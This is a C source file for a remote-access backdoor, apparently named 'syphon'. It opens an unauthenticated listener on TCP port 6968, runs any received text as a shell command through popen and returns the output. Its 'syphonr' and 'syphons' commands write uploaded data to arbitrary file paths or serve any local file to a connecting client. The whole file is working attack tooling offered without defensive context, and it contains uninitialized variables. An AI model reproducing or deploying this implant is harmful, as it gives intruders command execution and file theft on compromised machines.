#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <pthread.h>
#define PORT 6968

void *recv_server(void *rcmand)
{
	FILE *recv_file;
	int rs, crs, r;
	struct sockaddr_in raddr;
	int raddrlen = sizeof(raddr);
	char rbuf[8192];
	char *rhost, *rport, *rpath;
        char *rparams = strtok(rcmand, " ");
        for (rparams; rparams != NULL; rparams = strtok(NULL, " "))
       	{
          	if (r == 1) {
               		rhost = strdup(rparams);
		}
       		else if (r == 2) {
              		rport = strdup(rparams);
       		}
       		else if (r == 3) {
               		rpath = strdup(rparams);
       		}
       		r++;
       	}
	rpath[strcspn(rpath, "\n" )] = '\0';
	rpath[strcspn(rpath, "\r" )] = '\0';
	recv_file = fopen(rpath, "w");
	rs = socket(AF_INET, SOCK_STREAM, 0);
	raddr.sin_family = AF_INET;
	//rhost.sin_addr.s_addr = INADDR_ANY;
	raddr.sin_addr.s_addr = inet_addr(rhost);
	raddr.sin_port = htons(atoi(rport));
	bind(rs, (struct sockaddr *)&raddr, sizeof(raddr));
	listen(rs, 1);
	crs = accept(rs, (struct sockaddr *)&raddr,(socklen_t*)&raddrlen);
	while (recv(crs, rbuf, 8192, 0) != 0) {
		fputs(rbuf, recv_file);
		memset(rbuf, 0, 8192);
	}
	fclose(recv_file);
	close(crs);
	close(rs);
	return 0;
}

void *send_server(void *scmand)
{
	FILE *send_file;
	int ss, css, s;
	struct sockaddr_in saddr;
	int saddrlen = sizeof(saddr);
	char *sbuf;
	char *shost, *sport, *spath;
        char *sparams = strtok(scmand, " ");
        for (sparams; sparams != NULL; sparams = strtok(NULL, " "))
       	{
          	if (s == 1) {
               		shost = strdup(sparams);
		}
       		else if (s == 2) {
              		sport = strdup(sparams);
       		}
       		else if (s == 3) {
               		spath = strdup(sparams);
       		}
       		s++;
       	}
	spath[strcspn(spath, "\n" )] = '\0';
	spath[strcspn(spath, "\r" )] = '\0';
	send_file = fopen(spath, "r");
	fseek(send_file, 0, SEEK_END);
	long ssize = ftell(send_file);
	fseek(send_file, 0, SEEK_SET);
	sbuf = (char*)calloc(ssize, sizeof(char));
	fread(sbuf, sizeof(char), ssize, send_file);
	fclose(send_file);
	ss = socket(AF_INET, SOCK_STREAM, 0);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(shost);
	saddr.sin_port = htons(atoi(sport));
	bind(ss, (struct sockaddr *)&saddr, sizeof(saddr));
	listen(ss, 1);
	css = accept(ss, (struct sockaddr *)&saddr,(socklen_t*)&saddrlen);
	send(css, sbuf, ssize, 0);
	close(css);
	close(ss);
	return 0;
}

int main()
{
	FILE *cmand;
	int sock, csock, get_rcmand, recv_thread, send_thread, r;
	int status = 1;
	struct sockaddr_in address;
	int addrlen = sizeof(address);
	int opt = 1;
	char rcmand[128];
	char sysout[16384];
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
		perror("Could not connect server.");
		exit(EXIT_FAILURE);
	}
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
		perror("setsockopt");
		exit(EXIT_FAILURE);
	}
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons( PORT );

	if (bind(sock, (struct sockaddr *)&address, sizeof(address))<0) {
		perror("Could not bind server");
		exit(EXIT_FAILURE);
	}
	listen(sock, 1);
	while (status == 1) {
		if ((csock = accept(sock, (struct sockaddr *)&address,(socklen_t*)&addrlen))<0) {
			perror("Failed to accept.");
			exit(EXIT_FAILURE);
		}
		read(csock, rcmand, 128);
		if (strstr(rcmand, "syphonr")) {
			pthread_t recv_thread;
			pthread_create(&recv_thread, NULL, recv_server, rcmand);
			//pthread_join(recv_thread, NULL);
		}
		else if (strstr(rcmand, "syphons")) {
			pthread_t send_thread;
			pthread_create(&send_thread, NULL, send_server, rcmand);
			//pthread_join(send_thread, NULL);
		}
		else if (strstr(rcmand, "syphon exit")) {
			exit(0);
		}
		else {
			rcmand[strcspn(rcmand, "\n" )] = '\0';
			rcmand[strcspn(rcmand, "\r" )] = '\0';
			cmand = popen(rcmand, "r");
			while (fgets(sysout, sizeof(sysout), cmand) != NULL)
			{
				send(csock, sysout, 2048, 0);
			}
			close(csock);
		}
	}
	close(sock);
}
